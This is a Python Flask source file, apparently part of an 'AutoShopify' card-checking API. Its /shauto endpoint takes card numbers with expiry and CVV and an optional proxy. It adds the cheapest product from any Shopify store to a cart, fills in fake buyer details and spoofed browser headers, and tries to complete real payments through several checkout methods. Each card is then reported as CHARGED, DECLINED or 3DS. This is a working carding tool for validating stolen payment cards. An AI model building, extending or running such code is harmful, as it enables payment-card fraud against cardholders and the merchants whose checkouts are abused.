                    if any(pattern in response_text for pattern in threeds_patterns):
                        return {'result': '3DS', 'message': '3DSecure Authentication Required', 'actual_total': actual_total}
                    
                    # Unknown response type - default to declined like PHP
                    print(f"🔍 Debug: Unknown submit result type: {submit_result}")
                    return {'result': 'DECLINED', 'message': f'Unknown completion response: {submit_result.get("__typename", "Unknown")}', 'actual_total': actual_total}
            
            # No submit result - check raw response for patterns
            response_text = completion_resp.text.lower()
            
            # Success patterns
            if any(pattern in response_text for pattern in ['success', 'confirmed', 'thank_you', 'receipt']):
                return {'result': 'CHARGED', 'message': 'Payment successful', 'actual_total': actual_total}
            
            # Decline patterns
            if any(pattern in response_text for pattern in ['declined', 'failed', 'error', 'invalid']):
                return {'result': 'DECLINED', 'message': 'Payment declined', 'actual_total': actual_total}
            
            print(f"❌ No submit result found. Full response: {completion_data}")
            return {'result': 'DECLINED', 'message': 'Response Is Empty', 'actual_total': actual_total}
                
        except json.JSONDecodeError as e:
            print(f"❌ Failed to parse completion response as JSON: {e}")
            print(f"Response text: {completion_resp.text[:500]}...")
            return {'result': 'ERROR', 'message': f'Completion response parsing failed: Invalid JSON'}
        except Exception as e:
            print(f"❌ Completion parsing error: {str(e)}")
            print(f"Response data: {completion_resp.text[:500]}...")
            return {'result': 'ERROR', 'message': f'Completion parsing failed: {str(e)}'}
 
    except Exception as e:
        print(f"💥 GraphQL checkout error: {str(e)}")
        
        # If GraphQL checkout fails, try the simple checkout method
        print("🔄 GraphQL checkout failed, trying simple checkout method...")
        return attempt_simple_checkout(checkout_url, cc, mes, ano, cvv, address_data, session)

def extract_web_build_id(page_content):
    """Extract web build ID using multiple patterns"""
    patterns = [
        ('sha&quot;:&quot;', '&quot;}'),
        ('"sha":"', '"}'),
        ('"sha":"', '"'),
        ('sha":"', '","'),
        ('sha\\u0022:\\u0022', '\\u0022}'),
        ('buildId":"', '","'),
        ('buildId":"', '"'),
        ('build_id":"', '","'),
        ('build_id":"', '"'),
        ('webBuildId":"', '","'),
        ('webBuildId":"', '"'),
        ('web_build_id":"', '","'),
        ('web_build_id":"', '"'),
        ('checkout_build_id":"', '"'),
        ('"checkout":{"build_id":"', '"'),
        ('"checkout":{"buildId":"', '"'),
        # Compressed/minified patterns
        ('sha:"', '",'),
        ('sha:"', '"'),
        ('buildId:"', '",'),
        ('buildId:"', '"'),
    ]
    
    for start_pattern, end_pattern in patterns:
        result = find_between(page_content, start_pattern, end_pattern)
        if result and len(result) > 10:  # Web build IDs are typically longer
            print(f"✅ Found web build ID with pattern '{start_pattern}...{end_pattern}': {result[:20]}...")
            return result
    
    # Try regex patterns for common build ID formats
    regex_patterns = [
        r'"sha":\s*"([a-f0-9]{40,})"',
        r'"buildId":\s*"([a-f0-9-]{20,})"',
        r'"build_id":\s*"([a-f0-9-]{20,})"',
        r'"webBuildId":\s*"([a-f0-9-]{20,})"',
        r'"web_build_id":\s*"([a-f0-9-]{20,})"',
        r'buildId:\s*"([a-f0-9-]{20,})"',
        r'build_id:\s*"([a-f0-9-]{20,})"',
        r'sha:\s*"([a-f0-9]{40,})"',
    ]
    
    for pattern in regex_patterns:
        matches = re.findall(pattern, page_content, re.IGNORECASE)
        if matches:
            result = matches[0]
            print(f"✅ Found web build ID with regex '{pattern}': {result[:20]}...")
            return result
    
    return None

def extract_session_token(page_content):
    """Extract session token using multiple patterns - MODERN SHOPIFY APPROACH"""
    
    # For modern Shopify checkouts, the session token is often embedded in JavaScript
    # Look for common patterns in modern Shopify checkout pages
    
    import re
    
    # Pattern 1: Look for session token in JavaScript variables
    js_patterns = [
        r'sessionToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
        r'session_token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
        r'checkoutSessionToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
        r'window\.__checkout.*?sessionToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
        r'SESSION_TOKEN["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
    ]
    
    for pattern in js_patterns:
        matches = re.findall(pattern, page_content, re.IGNORECASE | re.DOTALL)
        if matches:
            result = matches[0]
            print(f"✅ Found session token with JS pattern '{pattern[:30]}...': {result[:20]}...")
            return result
    
    # Pattern 2: Look for base64-encoded tokens (common in modern Shopify)
    base64_pattern = r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']'
    base64_matches = re.findall(base64_pattern, page_content)
    
    for match in base64_matches:
        # Check if it looks like a session token (not too short, not too long)
        if 20 <= len(match) <= 200:
            try:
                # Try to decode as base64 to see if it's valid
                import base64
                decoded = base64.b64decode(match + '==')  # Add padding
                if len(decoded) > 10:  # Reasonable decoded length
                    print(f"✅ Found potential base64 session token: {match[:20]}...")
                    return match
            except:
                continue
    
    # Pattern 3: Look for UUID-like tokens
    uuid_pattern = r'["\']([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})["\']'
    uuid_matches = re.findall(uuid_pattern, page_content, re.IGNORECASE)
    if uuid_matches:
        result = uuid_matches[0]
        print(f"✅ Found UUID-style session token: {result[:20]}...")
        return result
    
    # Pattern 4: Look for checkout token in URL and use as session token (fallback)
    checkout_token_pattern = r'/cn/([A-Za-z0-9_-]{20,})'
    checkout_matches = re.findall(checkout_token_pattern, page_content)
    if checkout_matches:
        result = checkout_matches[0]
        print(f"✅ Using checkout token as session token: {result[:20]}...")
        return result
    
    # Pattern 5: Look for any long alphanumeric strings that could be tokens
    token_pattern = r'["\']([A-Za-z0-9_-]{30,})["\']'
    token_matches = re.findall(token_pattern, page_content)
    
    # Filter out common non-token strings
    exclude_patterns = ['http', 'https', 'class', 'style', 'script', 'function', 'window', 'document']
    
    for match in token_matches[:10]:  # Check first 10 matches
        if not any(exclude in match.lower() for exclude in exclude_patterns):
            print(f"✅ Found potential token: {match[:20]}...")
            return match
    
    return None

def extract_queue_token(page_content):
    """Extract queue token using multiple patterns"""
    patterns = [
        ('queueToken&quot;:&quot;', '&quot;'),
        ('"queueToken":"', '"'),
        ('queueToken":"', '","'),
        ('queue_token":"', '"'),
        ('queueToken\\u0022:\\u0022', '\\u0022'),
        # Compressed patterns
        ('queueToken:"', '",'),
        ('queueToken:"', '"'),
        ('queue_token:"', '"'),
    ]
    
    for start_pattern, end_pattern in patterns:
        result = find_between(page_content, start_pattern, end_pattern)
        if result:
            print(f"✅ Found queue token with pattern '{start_pattern}...{end_pattern}': {result[:20]}...")
            return result
    
    # Try regex patterns
    regex_patterns = [
        r'"queueToken":\s*"([^"]+)"',
        r'"queue_token":\s*"([^"]+)"',
        r'queueToken:\s*"([^"]+)"',
        r'queue_token:\s*"([^"]+)"',
    ]
    
    for pattern in regex_patterns:
        matches = re.findall(pattern, page_content)
        if matches:
            result = matches[0]
            print(f"✅ Found queue token with regex '{pattern}': {result[:20]}...")
            return result
    
    return None

def extract_stable_id(page_content):
    """Extract stable ID using multiple patterns"""
    patterns = [
        ('stableId&quot;:&quot;', '&quot;'),
        ('"stableId":"', '"'),
        ('stableId":"', '","'),
        ('stable_id":"', '"'),
        ('stableId\\u0022:\\u0022', '\\u0022'),
        # Compressed patterns
        ('stableId:"', '",'),
        ('stableId:"', '"'),
        ('stable_id:"', '"'),
    ]
    
    for start_pattern, end_pattern in patterns:
        result = find_between(page_content, start_pattern, end_pattern)
        if result:
            print(f"✅ Found stable ID with pattern '{start_pattern}...{end_pattern}': {result[:20]}...")
            return result
    
    # Try regex patterns
    regex_patterns = [
        r'"stableId":\s*"([^"]+)"',
        r'"stable_id":\s*"([^"]+)"',
        r'stableId:\s*"([^"]+)"',
        r'stable_id:\s*"([^"]+)"',
    ]
    
    for pattern in regex_patterns:
        matches = re.findall(pattern, page_content)
        if matches:
            result = matches[0]
            print(f"✅ Found stable ID with regex '{pattern}': {result[:20]}...")
            return result
    
    return None

def extract_payment_method_identifier(page_content):
    """Extract payment method identifier using multiple patterns"""
    patterns = [
        ('paymentMethodIdentifier&quot;:&quot;', '&quot;'),
        ('"paymentMethodIdentifier":"', '"'),
        ('paymentMethodIdentifier":"', '","'),
        ('payment_method_identifier":"', '"'),
        ('paymentMethodIdentifier\\u0022:\\u0022', '\\u0022'),
        # Compressed patterns
        ('paymentMethodIdentifier:"', '",'),
        ('paymentMethodIdentifier:"', '"'),
        ('payment_method_identifier:"', '"'),
    ]
    
    for start_pattern, end_pattern in patterns:
        result = find_between(page_content, start_pattern, end_pattern)
        if result:
            print(f"✅ Found payment method ID with pattern '{start_pattern}...{end_pattern}': {result[:20]}...")
            return result
    
    # Try regex patterns
    regex_patterns = [
        r'"paymentMethodIdentifier":\s*"([^"]+)"',
        r'"payment_method_identifier":\s*"([^"]+)"',
        r'paymentMethodIdentifier:\s*"([^"]+)"',
        r'payment_method_identifier:\s*"([^"]+)"',
    ]
    
    for pattern in regex_patterns:
        matches = re.findall(pattern, page_content)
        if matches:
            result = matches[0]
            print(f"✅ Found payment method ID with regex '{pattern}': {result[:20]}...")
            return result
    
    return None

## API BY @NANOSTRIKEBACKUP ##
@app.route('/test-extraction', methods=['GET'])
def test_extraction():
    """Test endpoint to debug token extraction"""
    # Sample HTML content that might be found in a Shopify checkout page
    sample_html = '''
    <script>
        window.__checkout = {
            "sha": "abc123def456789",
            "sessionToken": "session_token_12345",
            "queueToken": "queue_token_67890",
            "stableId": "stable_id_abcdef",
            "paymentMethodIdentifier": "shopify_installments_1"
        };
        
        var checkout_data = {
            "buildId": "build_id_123456",
            "session_token": "alt_session_token"
        };
    </script>
    '''
    
    # Test the extraction functions
    results = {
        'web_build_id': extract_web_build_id(sample_html),
        'session_token': extract_session_token(sample_html),
        'queue_token': extract_queue_token(sample_html),
        'stable_id': extract_stable_id(sample_html),
        'payment_method_id': extract_payment_method_identifier(sample_html)
    }
    
    return jsonify(results)

@app.route('/shauto', methods=['GET'])
def shauto():
    lista = request.args.get('lista')
    proxy = request.args.get('proxy')
    siteurl = request.args.get('siteurl')
    
    if not lista or not siteurl:
        return jsonify({'error': 'Missing required parameters: lista or siteurl', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
    
    try:
        card_details = lista.split('|')
        if len(card_details) != 4:
            return jsonify({'error': 'Invalid card format. Expected format: CC|MM|YYYY|CVV', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
        
        cc, mes, ano, cvv = card_details
        if len(ano) == 2:
            ano = f'20{ano}'
        
        session = create_session(proxy) if proxy else requests.Session()
        if proxy and session is None:
            return jsonify({'error': 'Invalid proxy format. Expected host:port:user:pass', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
        
        # Parse and validate site URL
        parsed_url = urlparse(siteurl)
        if not parsed_url.netloc:
            return jsonify({'error': 'Invalid URL', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
            
        domain = parsed_url.netloc
        site_base = f"{parsed_url.scheme}://{domain}"
        
        print(f"Processing checkout for domain: {domain}")
        
        # Step 1: Get products.json to find minimum price product (same as PHP)
        products_url = f"{site_base}/products.json"
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
                'Accept': 'application/json',
            }
            products_resp = session.get(products_url, headers=headers)
            
            if products_resp.status_code != 200:
                return jsonify({'error': f'Error fetching products: {products_resp.status_code}', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
                
            product_details = get_minimum_price_product_details(products_resp.text)
            if not product_details:
                return jsonify({'error': 'No valid products found', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
                
            print(f"Selected product: {product_details['title']} - ${product_details['price']}")
            
        except Exception as e:
            return jsonify({'error': f'Product discovery failed: {str(e)}', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
        
        # Step 2: Load site homepage to get country/currency info (like PHP)
        print(f"🌍 Loading site homepage to get country/currency info...")
        homepage_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }
        
        homepage_resp = session.get(site_base, headers=homepage_headers)
        if homepage_resp.status_code != 200:
            print(f"⚠️ Homepage load failed: {homepage_resp.status_code}")
        
        # Extract country and currency like PHP
        homepage_content = homepage_resp.text
        country_code = find_between(homepage_content, 'Shopify.country = "', '";')
        currency = find_between(homepage_content, 'Shopify.currency = {"active":"', '","rate":"1.0"};')
        
        if not currency:
            currency = "USD"
        if not country_code:
            country_code = "US"
            
        print(f"🌍 Detected country: {country_code}, currency: {currency}")
        
        # Step 3: Get address data based on country (like PHP)
        def get_address_for_country(country_code):
            """Get address data based on country code like PHP"""
            if country_code == 'US':
                return {
                    'first_name': 'Hell',
                    'last_name': 'King', 
                    'email': 'hellking@gmail.com',
                    'phone': '(879) 658-2525',
                    'address1': '133 New York 59',
                    'city': 'Monsey',
                    'province': 'NY',
                    'zip': '10036',
                    'country': 'US'
                }
            elif country_code == 'IN':
                return {
                    'first_name': 'Hell',
                    'last_name': 'King', 
                    'email': 'hellking@gmail.com',
                    'phone': '9433030230',
                    'address1': 'K-52, 2nd Floor, Sector 62',
                    'city': 'Noida',
                    'province': 'Uttar Pradesh',
                    'zip': '201301',
                    'country': 'IN'
                }
            elif country_code == 'AE':
                return {
                    'first_name': 'Hell',
                    'last_name': 'King', 
                    'email': 'hellking@gmail.com',
                    'phone': '971501234567',
                    'address1': 'Office 101, Sheikh Zayed Road',
                    'city': 'Dubai',
                    'province': 'Dubai',
                    'zip': '',
                    'country': 'AE'
                }
            else:
                # Default US address
                return {
                    'first_name': 'Hell',
                    'last_name': 'King', 
                    'email': 'hellking@gmail.com',
                    'phone': '(879) 658-2525',
                    'address1': '133 New York 59',
                    'city': 'Monsey',
                    'province': 'NY',
                    'zip': '10036',
                    'country': 'US'
                }
        
        address_data = get_address_for_country(country_code)
        print(f"Using address: {address_data['city']}, {address_data['province']}")
        
        # Step 4: Add product to cart using PHP method - cart/{product_id}:1
        print(f"🛒 Adding product to cart using PHP method: {product_details['id']}")
        
        cart_url = f"{site_base}/cart/{product_details['id']}:1"
        print(f"🔗 Cart URL: {cart_url}")
        
        cart_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }
        
        try:
            cart_resp = session.get(cart_url, headers=cart_headers, allow_redirects=True)
            
            print(f"📋 Cart response status: {cart_resp.status_code}")
            print(f"🔗 Final URL after redirect: {cart_resp.url}")
            
            if cart_resp.status_code != 200:
                print(f"❌ Cart response content: {cart_resp.text[:300]}...")
                return jsonify({'error': f'Cart addition failed: {cart_resp.status_code}', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
            
            # The cart response should redirect to a checkout URL
            checkout_url = cart_resp.url
            
            if '/checkouts/' not in checkout_url:
                # Try to find checkout URL in the response
                checkout_links = re.findall(r'href="([^"]*checkouts[^"]*)"', cart_resp.text)
                if checkout_links:
                    checkout_url = checkout_links[0]
                    if not checkout_url.startswith('http'):
                        checkout_url = site_base + checkout_url
                else:
                    return jsonify({'error': 'No checkout URL found after adding to cart', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
            
            print(f"✅ Product added to cart, checkout URL: {checkout_url}")
            
            # Extract total amount from cart page if available
            total_amount = product_details['price']  # Default to product price
            currency_symbol = "$"  # Default currency symbol
            
            print(f"💰 Cart total: {total_amount} {currency}")
            
        except Exception as e:
            return jsonify({'error': f'Cart addition failed: {str(e)}', 'DEV': 'Shubham(TheRam_Bhakt)'}), 400
        
        # Step 5: Attempt payment on checkout page using GraphQL method first
        print("🚀 Trying GraphQL checkout method (like PHP)...")
        payment_result = attempt_checkout_payment(checkout_url, cc, mes, ano, cvv, address_data, session, product_details)
        print(f"DEBUG: GraphQL result = {payment_result}")
        
        # If GraphQL gives any definitive result, use it
        if payment_result['result'] in ['CHARGED', 'DECLINED', '3DS', 'PROCESSING']:
            print(f"✅ GraphQL method succeeded with: {payment_result['result']}")
            # Use actual_total if available, otherwise fall back to original total_amount
            response_amount = payment_result.get('actual_total', total_amount)
            return jsonify({
                'result': payment_result['result'],
                'card': f"{cc}|{mes}|{ano}|{cvv}",
                'response': payment_result['message'],
                'amount': f"{response_amount} {currency}",
                'product': product_details['title'],
                'checkout_url': checkout_url,
                'DEV': 'Shubham(TheRam_Bhakt)'
            }), 200
        
        # GraphQL failed or was inconclusive, try direct form submission as backup
        print("🔄 GraphQL inconclusive, trying direct form submission as backup...")
        direct_result = attempt_direct_form_submission(checkout_url, cc, mes, ano, cvv, address_data, session)
        print(f"DEBUG: Direct form result = {direct_result}")
        
        # If direct submission gives any definitive result, use it
        if direct_result['result'] in ['CHARGED', 'DECLINED']:
            print(f"✅ Direct form submission succeeded with: {direct_result['result']}")
            return jsonify({
                'result': direct_result['result'],
                'card': f"{cc}|{mes}|{ano}|{cvv}",
                'response': direct_result['message'],
                'amount': f"{total_amount} {currency}",
                'product': product_details['title'],
                'checkout_url': checkout_url,
                'DEV': 'Shubham(TheRam_Bhakt)'
            }), 200
        
        # Try simple checkout method as final fallback
        print("🔄 Trying simple checkout method as final fallback...")
        simple_result = attempt_simple_checkout(checkout_url, cc, mes, ano, cvv, address_data, session)
        print(f"DEBUG: Simple checkout result = {simple_result}")
        
        # Return the best result we got
        if simple_result['result'] in ['CHARGED', 'DECLINED']:
            best_result = simple_result
            method_name = "Simple checkout"
        elif direct_result['result'] in ['CHARGED', 'DECLINED', '3DS', 'PROCESSING']:
            best_result = direct_result
            method_name = "Direct form"
        elif payment_result['result'] in ['CHARGED', 'DECLINED', '3DS', 'PROCESSING']:
            best_result = payment_result
            method_name = "GraphQL"
        else:
            # All methods were inconclusive
            best_result = payment_result  # Use GraphQL result as primary
            method_name = "GraphQL (primary)"
        
        return jsonify({
            'result': best_result['result'],
            'card': f"{cc}|{mes}|{ano}|{cvv}",
            'response': f"{method_name}: {best_result['message']}",
            'amount': f"{total_amount} {currency}",
            'product': product_details['title'],
            'checkout_url': checkout_url,
            'DEV': 'Shubham(TheRam_Bhakt)'
        }), 200

    except Exception as e:
        return jsonify({'error': f'Unexpected error: {str(e)}', 'DEV': 'Shubham(TheRam_Bhakt)'}), 500

def parse_proposal_response(proposal_resp, product_details):
    """Parse proposal response and extract required values like PHP does"""
    try:
        proposal_data = proposal_resp.json()
        print(f"✅ Proposal response received")
        
        # Check for GraphQL errors first
        if 'errors' in proposal_data:
            errors = proposal_data['errors']
            error_messages = [error.get('message', 'Unknown error') for error in errors]
            print(f"❌ GraphQL errors in proposal: {error_messages}")
            return {'result': 'ERROR', 'message': f'Proposal GraphQL errors: {", ".join(error_messages)}'}
        
        # FIXED: Extract proposal values like PHP does
        extracted_values = {
            'handle': None,
            'delivery_amount': None,
            'tax_amount': None,
            'total_amount': None
        }
        
        # Save proposal response for debugging
        try:
            with open('proposal_debug.json', 'w') as f:
                json.dump(proposal_data, f, indent=2)
            print("✅ Saved proposal response to proposal_debug.json")
        except Exception as e:
            print(f"⚠️ Could not save proposal debug: {e}")
        
        try:
            # Navigate to the proposal data like PHP: $firstStrategy = $response3js->data->session->negotiate->result->sellerProposal
            negotiate_result = proposal_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            print(f"🔍 Navigate result found: {bool(negotiate_result)}")
            
            if negotiate_result and negotiate_result.get('__typename') == 'NegotiationResultAvailable':
                seller_proposal = negotiate_result.get('sellerProposal', {})
                print(f"✅ Found sellerProposal with keys: {list(seller_proposal.keys())}")
                
                # Extract delivery data like PHP
                delivery_data = seller_proposal.get('delivery', {})
                if delivery_data and 'deliveryLines' in delivery_data:
                    delivery_lines = delivery_data['deliveryLines']
                    if delivery_lines and len(delivery_lines) > 0:
                        delivery_line = delivery_lines[0]
                        
                        # Method 1: Get selectedDeliveryStrategy handle (most accurate)
                        selected_strategy = delivery_line.get('selectedDeliveryStrategy', {})
                        if selected_strategy and 'handle' in selected_strategy:
                            extracted_values['handle'] = selected_strategy['handle']
                            print(f"✅ Extracted handle from selectedDeliveryStrategy: {extracted_values['handle']}")
                        
                        # Method 2: Get delivery amount from availableDeliveryStrategies[0] that matches the selected handle
                        available_strategies = delivery_line.get('availableDeliveryStrategies', [])
                        if available_strategies and len(available_strategies) > 0:
                            # Find the strategy that matches our selected handle
                            target_handle = extracted_values['handle']
                            for strategy in available_strategies:
                                if strategy.get('handle') == target_handle:
                                    amount_data = strategy.get('amount', {}).get('value', {})
                                    if amount_data and 'amount' in amount_data:
                                        extracted_values['delivery_amount'] = amount_data['amount']
                                        print(f"✅ Extracted delivery amount: {extracted_values['delivery_amount']}")
                                    break
                            
                            # If no match found, use first available strategy
                            if not extracted_values['delivery_amount'] and available_strategies[0].get('amount'):
                                amount_data = available_strategies[0].get('amount', {}).get('value', {})
                                if amount_data and 'amount' in amount_data:
                                    extracted_values['delivery_amount'] = amount_data['amount']
                                    print(f"✅ Extracted delivery amount from first strategy: {extracted_values['delivery_amount']}")
                
                # Extract tax amount from seller proposal
                tax_data = seller_proposal.get('tax', {})
                if tax_data and 'totalTaxAmount' in tax_data:
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {})
                    if tax_amount_data and 'amount' in tax_amount_data:
                        extracted_values['tax_amount'] = tax_amount_data['amount']
                        print(f"✅ Extracted tax amount: {extracted_values['tax_amount']}")
                else:
                    # If no tax data provided, calculate tax from total - product - delivery
                    if extracted_values.get('total_amount') and extracted_values.get('delivery_amount'):
                        try:
                            product_price = float(product_details['price'])
                            total_price = float(extracted_values['total_amount'])
                            delivery_price = float(extracted_values['delivery_amount'])
                            calculated_tax = total_price - product_price - delivery_price
                            
                            # If calculated tax is negative or very small, assume tax is included in other amounts
                            if calculated_tax <= 0.10:  # Less than 10 cents
                                extracted_values['tax_amount'] = "0.00"
                                print(f"✅ Tax appears to be included in prices, using tax: $0.00")
                            else:
                                extracted_values['tax_amount'] = f"{calculated_tax:.2f}"
                                print(f"✅ Calculated tax amount: {extracted_values['tax_amount']}")
                        except (ValueError, TypeError) as e:
                            extracted_values['tax_amount'] = "0.00"
                            print(f"⚠️ Tax calculation failed, using 0.00: {e}")
                    else:
                        extracted_values['tax_amount'] = "0.00"
                        print(f"⚠️ No tax data available, using tax: $0.00")
                
                # Extract total amount from runningTotal
                running_total = seller_proposal.get('runningTotal', {})
                if running_total and 'value' in running_total:
                    total_data = running_total['value']
                    if total_data and 'amount' in total_data:
                        extracted_values['total_amount'] = total_data['amount']
                        print(f"✅ Extracted total amount: {extracted_values['total_amount']}")
                        
        except Exception as e:
            print(f"⚠️ Error extracting proposal values: {e}")
        
        # Check if we got the critical values
        if not extracted_values['handle']:
            print("❌ Could not extract delivery handle from proposal - using fallback strategy")
            # Instead of failing, try to extract using PHP fallback method
            response_text = proposal_resp.text
            handle_fallback = find_between(response_text, ',"selectedDeliveryStrategy":{"handle":"', '","__typename":"DeliveryStrategyReference')
            if handle_fallback:
                extracted_values['handle'] = handle_fallback
                print(f"✅ Got handle via fallback: {extracted_values['handle']}")
            else:
                # If still no handle, use a generic one or return error
                print("❌ No delivery handle available - this may cause REQUIRED_ARTIFACTS_UNAVAILABLE")
                # Instead of hard failing, let's try with a generic approach
                extracted_values['handle'] = "standard-shipping"  # Generic fallback
        
        if not extracted_values['delivery_amount']:
            print("❌ Could not extract delivery amount from proposal - using estimated value")
            extracted_values['delivery_amount'] = "5.00"  # Standard shipping estimate
        
        if not extracted_values['tax_amount']:
            print("⚠️ Could not extract tax amount, using 0.00")
            extracted_values['tax_amount'] = "0.00"
        
        if not extracted_values['total_amount']:
            print("❌ Could not extract total amount from proposal - calculating estimate")
            # Calculate estimated total (we don't have actual_total here, so use product price + estimates)
            product_price = float(product_details['price'])
            delivery_price = float(extracted_values['delivery_amount']) 
            tax_price = float(extracted_values['tax_amount'])
            estimated_total = product_price + delivery_price + tax_price
            extracted_values['total_amount'] = str(estimated_total)
            print(f"✅ Using estimated total: ${extracted_values['total_amount']}")
        
        print(f"✅ Proposal values ready (extracted or estimated)")
        return extracted_values  # Return the extracted values instead of success message
        
    except json.JSONDecodeError as e:
        print(f"❌ Failed to parse proposal response as JSON: {e}")
        print(f"Response text: {proposal_resp.text[:500]}...")
        return {'result': 'ERROR', 'message': f'Proposal response parsing failed: Invalid JSON'}
    except Exception as e:
        print(f"❌ Proposal parsing error: {str(e)}")
        print(f"Response data: {proposal_resp.text[:500]}...")
        return {'result': 'ERROR', 'message': f'Proposal parsing failed: {str(e)}'}

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'pid': os.getpid()
    }), 200

@app.route('/shutdown', methods=['POST'])
def shutdown_server():
    """Shutdown endpoint (require authentication)"""
    auth_key = request.headers.get('Authorization')
    expected_key = os.environ.get('SHUTDOWN_KEY', 'default_shutdown_key_123')
    
    if auth_key != f"Bearer {expected_key}":
        return jsonify({'error': 'Unauthorized'}), 401
    
    app.logger.info("Shutdown requested via API")
    
    def shutdown():
        time.sleep(1)
        shutdown_flag.set()
        os._exit(0)
    
    thread = threading.Thread(target=shutdown)
    thread.start()
    
    return jsonify({'message': 'Server shutting down...'}), 200

if __name__ == '__main__':
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='AutoShopify API Server')
    parser.add_argument('--daemon', action='store_true', help='Run as daemon in background')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=6902, help='Port to bind to (default: 6902)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--install-deps', action='store_true', help='Force install Python dependencies')
    parser.add_argument('--install-system-deps', action='store_true', help='Install system dependencies (requires sudo)')
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(daemon_mode=args.daemon)
    
    if args.daemon:
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        
        # Create PID file
        pid = create_pid_file()
        app.logger.info(f"Starting AutoShopify API Server as daemon (PID: {pid})")
        print(f"Starting AutoShopify API Server as daemon (PID: {pid})")
        print(f"Server running on http://{args.host}:{args.port}")
        print("Use the following command to stop the server:")
        print(f"curl -X POST -H 'Authorization: Bearer {os.environ.get('SHUTDOWN_KEY', 'default_shutdown_key_123')}' http://{args.host}:{args.port}/shutdown")
        print("Or kill the process: kill $(cat autoshopify.pid)")
        
        # Register cleanup function
        import atexit
        atexit.register(remove_pid_file)
        
        try:
            app.run(host=args.host, port=args.port, debug=False, use_reloader=False)
        except KeyboardInterrupt:
            app.logger.info("Server interrupted by user")
        finally:
            remove_pid_file()
    else:
        # Normal mode
        print(f"Starting AutoShopify API Server in normal mode")
        port = int(os.environ.get("PORT", 5000))
        print(f"Server running on http://{args.host}:{port}")
        app.run(host=args.host, port=port, debug=args.debug)

